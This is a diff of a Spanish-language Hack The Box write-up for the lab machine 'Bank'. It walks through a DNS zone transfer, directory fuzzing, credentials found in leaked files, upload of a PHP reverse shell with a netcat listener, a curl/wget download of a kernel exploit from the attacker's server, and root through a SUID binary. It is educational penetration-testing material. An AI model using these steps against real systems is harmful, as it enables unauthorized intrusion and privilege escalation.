@@ -1,7 +1,7 @@
 ---
 layout: single
 title: Bank - Hack The Box
-excerpt: "Esta máquina fue algo dificil porque no pude escalar privilegios usando un exploit sino que se usa un binario que automaticamente te convierte en root, además de que tuve que investigar bastante sobre operaciones REGEX (como las odio) para poder filtrar texto. Aunque se ven temas interesantes como el ataque de transferencia de zona DNS y veremos acerca del virtual hosting que por lo que he investigado, hay otras máquina que lo van a ocupar."
+excerpt: "Esta máquina fue algo difícil porque no pude escalar privilegios usando un Exploit sino que se usa un binario que automáticamente te convierte en Root, además de que tuve que investigar bastante sobre operaciones REGEX (como las odio) para poder filtrar texto. Aunque se ven temas interesantes como el ataque de transferencia de zona DNS y veremos acerca del virtual hosting que por lo que he investigado, hay otras máquinas que lo van a ocupar."
 date: 2023-02-19
 classes: wide
 header:
@@ -25,11 +25,11 @@ tags:
   - OSCP Style
 ---
 ![](/assets/images/htb-writeup-bank/bank_logo.png)
-Esta máquina fue algo dificil porque no pude escalar privilegios usando un exploit sino que se usa un binario que automaticamente te convierte en root, además de que tuve que investigar bastante sobre operaciones REGEX (como las odio) para poder filtrar texto. Aunque se ven temas interesantes como el ataque de transferencia de zona DNS y veremos acerca del virtual hosting que por lo que he investigado, hay otras máquina que lo van a ocupar.
+Esta máquina fue algo difícil porque no pude escalar privilegios usando un Exploit sino que se usa un binario que automáticamente te convierte en Root, además de que tuve que investigar bastante sobre operaciones REGEX (como las odio) para poder filtrar texto. Aunque se ven temas interesantes como el **ataque de transferencia de zona DNS** y veremos acerca del **virtual hosting** que por lo que he investigado, hay otras máquina que lo van a ocupar.
 
 # Recopilación de Información
 ## Traza ICMP
-Vamos a realizar un ping para saber si la máquina esta activa y en base al TTL veamos que SO opera ahi.
+Vamos a realizar un ping para saber si la máquina está activa y en base al TTL veamos que SO opera ahí.
 ```
 ping -c 4 10.10.10.29                                                             
 PING 10.10.10.29 (10.10.10.29) 56(84) bytes of data.
@@ -78,7 +78,7 @@ Nmap done: 1 IP address (1 host up) scanned in 24.00 seconds
 * -Pn: Para indicar que se omita el descubrimiento de hosts.
 * -oG: Para indicar que el output se guarde en un fichero grepeable. Lo nombre allPorts.
 
-Hay tres puertos abiertos, hay 2 servicios que ya conocemos por los puertos, estos son el servicio SSH y el http. Veamos que nos dice el escaneo de servicios.
+Hay tres puertos abiertos, hay 2 servicios que ya conocemos por los puertos, estos son el servicio SSH y el HTTP. Veamos que nos dice el escaneo de servicios.
 
 ## Escaneo de Servicios
 ```
@@ -110,32 +110,35 @@ Nmap done: 1 IP address (1 host up) scanned in 16.66 seconds
 * -p: Para indicar puertos específicos.
 * -oN: Para indicar que el output se guarde en un fichero. Lo llame targeted.
 
-Vemos lo que opera en los puertos, para empezar como no tenemos credenciales no podemos entrar al servicio SSH así que lo unico que podemos hacer es revisar la pagina web.
+Vemos lo que opera en los puertos, para empezar como no tenemos credenciales no podemos entrar al servicio SSH así que lo único que podemos hacer es revisar la página web.
 
 ![](/assets/images/htb-writeup-bank/Captura1.png)
 
-Pues nos manda la pagina por defecto de apache y no nos muestra nada en realidad. Incluso no es necesario ver el Wappalizer porque de plano no nos muestra nada que nos pueda ayudar.
+Pues nos manda la página por defecto de Apache y no nos muestra nada en realidad. Incluso no es necesario ver el **Wappalizer** porque de plano no nos muestra nada que nos pueda ayudar.
 
-Entonces que hacemos? Es momento de investigar.
+¿Entonces que hacemos? Es momento de investigar.
 
+# Análisis de Vulnerabilidades
 ## Investigación del Puerto 80
 Bueno para el caso de esta máquina hay que ser preciso en 2 puntos:
-* No es lo mismo poner una IP de un dominio a poner el nombre del dominio, ejemplo, 10.10.10.29 o Ejemplo.com
-Por que? Porque quiza el servidor o máquina donde esten operando dichas paginas web tenga activo el Virtual Hosting.
 
-Y esta madre que es? Bueno:
+* No es lo mismo poner una IP de un dominio a poner el nombre del dominio, ejemplo, 10.10.10.29 o Ejemplo.com
+
+¿Por qué? Porque quizá el servidor o máquina donde estén operando dichas páginas web tenga activo el **Virtual Hosting**.
+
+¿Y esta madre que es? Bueno:
 
 **El alojamiento compartido o alojamiento virtual, en inglés Virtual hosting, es una de las modalidades más utilizadas por las empresas dedicadas al negocio del alojamiento web. Dependiendo de los recursos disponibles, permite tener una cantidad variable de dominios y sitios web en una misma máquina.​**
 
-Es decir que pueden haber varios dominios en solo una máquina, como en este caso.
+Es decir, que puede haber varios dominios en solo una máquina, como en este caso.
 
-Que podemos hacer? Es sencillo, para nuestro caso HackTheBox suele tener dominios con el nombre de la máquina seguido de **.htb**. Podremos probar si esto es verdad mandando un ping al dominio **bank.htb**, que deducimos es el nombre de dominio que esta ocupando la máquina:
+¿Qué podemos hacer? Es sencillo, para nuestro caso **HackTheBox** suele tener dominios con el nombre de la máquina seguido de **.htb**. Podremos probar si esto es verdad mandando un ping al dominio **bank.htb**, que deducimos es el nombre de dominio que está ocupando la máquina:
 
 ```
 ping -c 1 bank.htb   
 ping: bank.htb: Nombre o servicio desconocido
 ```
-Ok, pero no nos sale nada, ahora que? Tan simple como que tengamos que registrar ese dominio en el archivo **hosts** que esta guardado en el directorio **etc**, hagamoslo:
+Ok, pero no nos sale nada, ¿ahora qué? Tan simple como que tengamos que registrar ese dominio en el archivo **hosts** que esta guardado en el directorio **etc**, hagámoslo:
 ```
 locate /etc/hosts    
 /etc/hosts
@@ -157,15 +160,15 @@ PING bank.htb (10.10.10.29) 56(84) bytes of data.
 1 packets transmitted, 1 received, 0% packet loss, time 0ms
 rtt min/avg/max/mdev = 130.266/130.266/130.266/0.000 ms
 ```
-EXCELENTE! Ahora sabemos que ese dominio si existe, por lo que intentemos entrar en el poniendo el nombre del dominio directamente en el buscador.
+¡EXCELENTE! Ahora sabemos que ese dominio si existe, por lo que intentemos entrar en el poniendo el nombre del dominio directamente en el buscador.
 
 ![](/assets/images/htb-writeup-bank/Captura2.png)
 
-Ahi esta, tenemos un login, veamos que nos dice el Wappalizer:
+Ahí está, tenemos un login, veamos que nos dice el **Wappalizer**:
 
 ![](/assets/images/htb-writeup-bank/Captura3.png)
 
-Tenemos bastante información que nos puede ser util más adelante. Ahora vamos a utilizar una herramienta bastante util para estos casos llamada **dig**.
+Tenemos bastante información que nos puede ser útil más adelante. Ahora vamos a utilizar una herramienta bastante útil para estos casos llamada **dig**.
 
 **Dig (Domain Information Groper) es una herramienta de línea de comandos de Linux que realiza búsquedas en los registros DNS, a través de los nombres de servidores, y te muestra el resultado.**
 
@@ -174,6 +177,7 @@ Aqui el link con más información:
 * https://www.hostinger.mx/tutoriales/comando-dig-linux
 
 Entonces, utilicemos esta herramienta, hagamos varias pruebas:
+
 * Vamos a especificar los nombres de servidores:
 ```
 dig @10.10.10.29 bank.htb     
@@ -199,7 +203,7 @@ ns.bank.htb.            604800  IN      A       10.10.10.29
 ;; WHEN: Mon Apr 03 13:12:37 CST 2023
 ;; MSG SIZE  rcvd: 86
 ```
-* Bien, ahora veamos que correos estan registrados en la máquina:
+* Bien, ahora veamos que correos están registrados en la máquina:
 ```
 dig @10.10.10.29 bank.htb MX  
 ; <<>> DiG 9.18.12-1-Debian <<>> @10.10.10.29 bank.htb MX
@@ -220,9 +224,10 @@ bank.htb.               604800  IN      SOA     bank.htb. chris.bank.htb. 5 6048
 ;; WHEN: Mon Apr 03 13:17:34 CST 2023
 ;; MSG SIZE  rcvd: 79
 ```
-Muy bien, tenemos un correo que en este caso puede ser un usuario para que podamos accesar despues. Lo que podemos hacer son 2 cosas, la primera un Fuzzing para ver que sub dominios tiene esta pagina web y dos, ver si podemos hacer un ataque de transferencia de zona.
+Muy bien, tenemos un correo que en este caso puede ser un usuario para que podamos acceder después. Lo que podemos hacer son 2 cosas, la primera un **Fuzzing** para ver que subdominios tiene esta página web y dos, ver si podemos hacer un **ataque de transferencia de zona DNS**.
 
-Primero hagamos el fuzzing y luego explico el ataque:
+## Fuzzing
+Primero hagamos el **Fuzzing** y luego explico el ataque:
 ```
 wfuzz -c --hc=404 -t 200 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt http://bank.htb/FUZZ/    
  /usr/lib/python3/dist-packages/wfuzz/__init__.py:34: UserWarning:Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz's documentation for more information.
@@ -265,18 +270,18 @@ Filtered Requests: 220539
 Requests/sec.: 376.8565
 ```
 * -c: Para que se muestren los resultados con colores.
-* --hc: Para que no muestre el codigo de estado 404, hc = hide code.
-* -t: Para usar una cantidad especifica de hilos.
+* --hc: Para que no muestre el código de estado 404, hc = hide code.
+* -t: Para usar una cantidad específica de hilos.
 * -w: Para usar un diccionario de wordlist.
 * Diccionario que usamos: dirbuster
 
 Bien, vemos algunos subdominios que podemos investigar, ahora el ataque.
 
-Que es un **Ataque de Transferencia de Zona**:
+¿Qué es un **Ataque de Transferencia de Zona DNS**?:
 
 **Una transferencia de zona es un mecanismo para replicar datos de DNS a través de servidores DNS. Es decir si se tienen dos servidores DNS, el primer servidor confía en AXFR para poner los mismos datos en un segundo servidor. AXFR es también utilizado por terceros no autorizados quienes requieran obtener datos más profundos de un sitio.**
 
-Entonces lo que conseguiremos sera más información sobre subdominios, algo similar al Fuzzing que hicimos, entonces probemoslo: 
+Entonces lo que conseguiremos será más información sobre subdominios, algo similar al **Fuzzing** que hicimos, entonces probémoslo: 
 ```
  dig @10.10.10.29 bank.htb AXFR
 
@@ -294,42 +299,44 @@ bank.htb.               604800  IN      SOA     bank.htb. chris.bank.htb. 5 6048
 ;; WHEN: Mon Apr 03 13:23:13 CST 2023
 ;; XFR size: 6 records (messages 1, bytes 171)
 ```
-Pues mucha información no nos dio, asi que vamos a analizar los subdominios que obtuvimos del fuzzeo.
+Pues mucha información no nos dio, así que vamos a analizar los subdominios que obtuvimos del **Fuzzing**.
 
-# Analisis de Vulnerabilidades
 ## Analizando subdominios
-Hice dos pruebas de fuzzing, una normal, que es la que esta arriba, y la otra poniendo la extension .php, en esta ultima no salio nada relevante, solo queria mencionarlo.
+Hice dos pruebas de **Fuzzing**, una normal, que es la que está arriba, y la otra poniendo la extension **.php**, en esta última no salió nada relevante, solo quería mencionarlo.
 
 Como vemos, hay algunos subdominios, pero el que más llama la atención es el **balance-transfer**, entremos a ese:
 
 ![](/assets/images/htb-writeup-bank/Captura5.png)
 
-Changos, hay muchos archivos, pero que es esa extención .acc, vamos a investigarla:
+Changos, hay muchos archivos, pero ¿qué es esa extención **.acc**?, vamos a investigarla:
+
 **Los archivos en el formato ACC son utilizados por el software de Cuentas gráficas como archivos de datos de salida del proyecto que contienen datos introducidos por el autor de los archivos del CAC.**
 
-Quiero entender que aqui se guardan datos que se han utilizado en la pagina web, como son muchos no quiero ponerme a ver cada uno a menos que lo requiera, entonces lo que haremos sera descargar el texto de esta pagina para buscar si hay alguno diferente.
+Quiero entender que aquí se guardan datos que se han utilizado en la página web, como son muchos no quiero ponerme a ver cada uno a menos que lo requiera, entonces lo que haremos será descargar el texto de esta página para buscar si hay alguno diferente.
 
-Y esto por que? Porque hay muchos con el mismo peso, debe haber algunos con menor o mayor peso y eso quiere decir que son unicos.
+¿Y esto por qué? Porque hay muchos con el mismo peso, debe haber algunos con menor o mayor peso y eso quiere decir que son únicos.
 
-Para descargar el texto vamos a usar curl y expresiones regex para filtrar, vamos por pasos:
-* Descargamos el texto de esta pagina:
+Para descargar el texto vamos a usar **curl** y expresiones **REGEX** para filtrar, vamos por pasos:
+
+* Descargamos el texto de esta página:
 ```
 curl -s -X GET "http://bank.htb/balance-transfer/"
 ```
-Si lo dejamos asi, solo veremos el codigo HTML por lo que usaremos la herrmaienta **html2text** para cambiar de HTML a texto:
+Si lo dejamos así, solo veremos el código HTML por lo que usaremos la herramienta **html2text** para cambiar de HTML a texto:
 ```
 curl -s -X GET "http://bank.htb/balance-transfer/" | html2text
 ```
-Ahora si se ve en texto, pero no quiero que se vean esos corchetes además de que nos molestaran a la hora del filtrado, asi que vamos a eliminarlos con **awk**:
+Ahora si se ve en texto, pero no quiero que se vean esos corchetes además de que nos molestaran a la hora del filtrado, así que vamos a eliminarlos con **awk**:
 ```
 curl -s -X GET "http://bank.htb/balance-transfer/" | html2text | awk '{print $3 " " $5}' > output.txt
 ```
-Ahora si, con eso ya solamente quedaria el nombre del archivo y su peso.
-* Filtramos por regex para ver si hay archivos con menor o mayor peso:
+Ahora sí, con eso ya solamente quedaría el nombre del archivo y su peso.
+
+* Filtramos por **REGEX** para ver si hay archivos con menor o mayor peso:
 ```
 cat output | sed '/^\s*$/d' |
 ```
-Con **sed** vamos a eliminar los espacios que hay entre cada archivo de arriba a abajo para que solo queden los puros nombres y pesos. Y con grep vamos a ir eliminando los pesos más comunes que vimos a ojo de buen cubero, osea el 585, 584, 583 y 582:
+Con **sed** vamos a eliminar los espacios que hay entre cada archivo de arriba a abajo para que solo queden los puros nombres y pesos. Y con grep vamos a ir eliminando los pesos más comunes que vimos a ojo de buen cubero, ósea el 585, 584, 583 y 582:
 ```
 cat output | sed '/^\s*$/d' | grep -v -E "582|583|584|585"
 ```
@@ -344,7 +351,7 @@ Last Description
 68576f20e9732f1b2edc4df5b8533230.acc 257
 Server bank.htb
 ```
-BRAVO! Hay 3 archivos poco comunes pero el que más llama la atención es el que pesa 257, vamos a descargarlo buscandolo en la pagina y dandole click:
+¡BRAVO! Hay 3 archivos poco comunes pero el que más llama la atención es el que pesa 257, vamos a descargarlo buscándolo en la página y dándole click:
 
 ![](/assets/images/htb-writeup-bank/Captura6.png)
 
@@ -365,27 +372,27 @@ Transactions: 39
 Balance: 8842803 .
 ===UserAccount===
 ```
-Mira nada más, son el usuario y contraseña, bueno ya teniamos el usuario, ahora vamos a probarlos:
+Mira nada más, son el usuario y contraseña, bueno ya teníamos el usuario, ahora vamos a probarlos:
 
 ![](/assets/images/htb-writeup-bank/Captura7.png)
 
-Entramos! Investiguemos que podemos hacer.
+¡Entramos! Investiguemos que podemos hacer.
 
 ![](/assets/images/htb-writeup-bank/Captura8.png)
 
-Veo que podemos subir archivos pero no dice de que tipo. Quiza si analisamos el codigo fuente de la pagina podremos encontrar algo util, para hacer esto solo oprimimos **crtl + u**:
+Veo que podemos subir archivos, pero no dice de que tipo. Quizá si analizamos el código fuente de la página podremos encontrar algo útil, para hacer esto solo oprimimos **ctrl + u**:
 
 ![](/assets/images/htb-writeup-bank/Captura9.png)
 
-Ahi esta! Solamente acepta archivos con terminación **.htb** y dichos archivos deben ser hechos en **PHP**, lo que podemos hacer es cargar un payload para poder conectarnos de manera remota. Busquemos uno en internet:
+¡Ahí está! Solamente acepta archivos con terminación **.htb** y dichos archivos deben ser hechos en **PHP**, lo que podemos hacer es cargar un Payload para poder conectarnos de manera remota. Busquemos uno en internet:
 
-Aqui un payload:
+Aqui un Payload:
 * https://github.com/pentestmonkey/php-reverse-shell
 
-# Explotando Vulnerabilidadaes
+# Explotación de Vulnerabilidadaes
+En el link anterior hay un Payload hecho en **PHP** que debemos modificar metiendo nuestra IP y un puerto al que debemos conectarnos, hagámoslo por pasos:
 
-En el link anterior hay un payload hecho en PHP que debemos modificar metiendo nuestra IP y un puerto al que debemos conectarnos, hagamoslo por pasos:
-* Descargando payload:
+* Descargando Payload:
 ```
 git clone https://github.com/pentestmonkey/php-reverse-shell.git                         
 Clonando en 'php-reverse-shell'...
@@ -396,14 +403,14 @@ remote: Total 10 (delta 1), reused 1 (delta 1), pack-reused 7
 Recibiendo objetos: 100% (10/10), 9.81 KiB | 837.00 KiB/s, listo.
 Resolviendo deltas: 100% (2/2), listo.
 ```
-* Ahora modificamos el payload, puedes eliminar lo demás, no es necesario:
+* Ahora modificamos el Payload, puedes eliminar lo demás, no es necesario:
 ```
 $VERSION = "1.0";
 $ip = 'Tu_IP';  // CHANGE THIS
 $port = Puerto_Que_Quieras;       // CHANGE THIS
 $chunk_size = 1400;
 ```
-* Bien, vamos a renombrarlo para agregarle la extension **.htb**:
+* Bien, vamos a renombrarlo para agregarle la extensión **.htb**:
 ```
 mv php-reverse-shell.php LocalPE.htb
 ```
@@ -411,16 +418,16 @@ mv php-reverse-shell.php LocalPE.htb
 
 ![](/assets/images/htb-writeup-bank/Captura10.png)
 
-* Levantamos una netcat con el puerto que pusimos en el payload:
+* Levantamos una netcat con el puerto que pusimos en el Payload:
 ```
 nc -nvlp 443                          
 listening on [any] 443 ...
 ```
-* Ya cargado en la pagina el payload, le damos click en donde lo pide:
+* Ya cargado en la página el Payload, le damos click en donde lo pide:
 
 ![](/assets/images/htb-writeup-bank/Captura11.png)
 
-* Y estamos dentro!:
+* ¡Y estamos dentro!:
 ```
 nc -nvlp 443                          
 listening on [any] 443 ...
@@ -436,7 +443,7 @@ www-data
 Ya solo es cosa de buscar la flag del usuario que esta en el directorio **/home**.
 
 # Post Explotación
-Que podemos hacer? Lo más facil seria ver que permisos tenemos pero antes vamos a sacar un terminal más interactiva:
+¿Qué podemos hacer? Lo más fácil seria ver que permisos tenemos, pero antes vamos a sacar un terminal más interactiva:
 ```
 $ python -c 'import pty; pty.spawn("/bin/bash")'
 www-data@bank:/$ ls
@@ -451,7 +458,7 @@ www-data@bank:/$ id
 id
 uid=33(www-data) gid=33(www-data) groups=33(www-data)
 ```
-Mmmmm no creo que sean muy utiles los permisos, veamos que versión de linux tiene aunque el escaneo de servicios ya nos lo dio:
+Mmmmm no creo que sean muy útiles los permisos, veamos que versión de Linux tiene, aunque el escaneo de servicios ya nos lo dio:
 ```
 www-data@bank:/$ uname -r
 uname -r
@@ -460,11 +467,11 @@ www-data@bank:/$ uname -a
 uname -a
 Linux bank 4.4.0-79-generic #100~14.04.1-Ubuntu SMP Fri May 19 18:37:52 UTC 2017 i686 athlon i686 GNU/Linux
 ```
-Muy bien, busquemos un exploit. Buscando un exploit por internet, encontre este:
+Muy bien, busquemos un Exploit. Buscando un Exploit por internet, encontré este:
 
 * https://www.exploit-db.com/exploits/44298
 
-Bien, busquemoslo con **SearchSploit**:
+Bien, busquemoslo con **Searchsploit**:
 ```
 searchsploit Ubuntu 16.04.4  
 ----------------------------------------------------------------------------------------------------------- ---------------------------------
@@ -475,7 +482,7 @@ Linux Kernel < 4.4.0-116 (Ubuntu 16.04.4) - Local Privilege Escalation          
 Shellcodes: No Results
 Papers: No Results
 ```
-Analizandolo un poco pues no creo que nos sirva mucho, más que nada no tiene especificaciones sobre como usarlo, entonces busquemos otro:
+Analizándolo un poco pues no creo que nos sirva mucho, más que nada no tiene especificaciones sobre cómo usarlo, entonces busquemos otro:
 ```
 searchsploit Linux 4.4.0-79        
 ----------------------------------------------------------------------------------------------------------- ---------------------------------
@@ -525,7 +532,7 @@ searchsploit -m linux/local/47169.c
  Verified: False
 File Type: C source, ASCII text
 ```
-Excelente, nos da especificaciones sobre como usarlo:
+Excelente, nos da especificaciones sobre cómo usarlo:
 ```
 // Usage:
 // user@ubuntu:~$ uname -a
@@ -538,7 +545,7 @@ Excelente, nos da especificaciones sobre como usarlo:
 // user@ubuntu:~$ ./pwn
 ```
 Ahora intentemos subirlo, vamos por pasos:
-* Primero vamos a abrir un servidor con python:
+* Primero vamos a abrir un servidor con Python:
 ```
 python3 -m http.server                                                            
 Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
@@ -553,16 +560,16 @@ curl -O http://10.10.14.14:8000/LocalPE.c
   9 28360    9  2656    0     0   9388      0  0:00:03 --:--:--  0:00:03  9418
 curl: (23) Failed writing body (0 != 2656)
 ```
-* Chetos no se puede, intentemoslo de otra forma:
+* Chetos no se puede, intentémoslo de otra forma:
 ```
 www-data@bank:/$ wget 10.10.14.14/LocalPE.c
 wget 10.10.14.14/LocalPE.c
 --2023-04-04 02:11:28--  http://10.10.14.14/LocalPE.c
 Connecting to 10.10.14.14:80... failed: Connection refused.
 ```
-Era OBVIO que no teniamos permisos para descargar cosas xd, solamente lo hice para tener un ejemplo de como enviar archivos a un SO Linux.
+Era OBVIO que no teníamos permisos para descargar cosas xd, solamente lo hice para tener un ejemplo de cómo enviar archivos a un SO Linux.
 
-Entonces que queda? Investiguemos que archivos tenemos permisos para usar:
+¿Entonces que queda? Investiguemos que archivos tenemos permisos para usar:
 ```
 www-data@bank:/$ find \-perm -4000 2>/dev/null
 find \-perm -4000 2>/dev/null
@@ -602,7 +609,7 @@ www-data@bank:/$ ls -la ./var/htb/bin/emergency
 ls -la ./var/htb/bin/emergency
 -rwsr-xr-x 1 root root 112204 Jun 14  2017 ./var/htb/bin/emergency
 ```
-Mmmm root? Osea que si lo ejecutamos, seremos root? Hagamoslo:
+Mmmm ¿Root? Ósea que, si lo ejecutamos, ¿seremos Root? Hagámoslo:
 ```
 www-data@bank:/$ ./var/htb/bin/emergency
 ./var/htb/bin/emergency
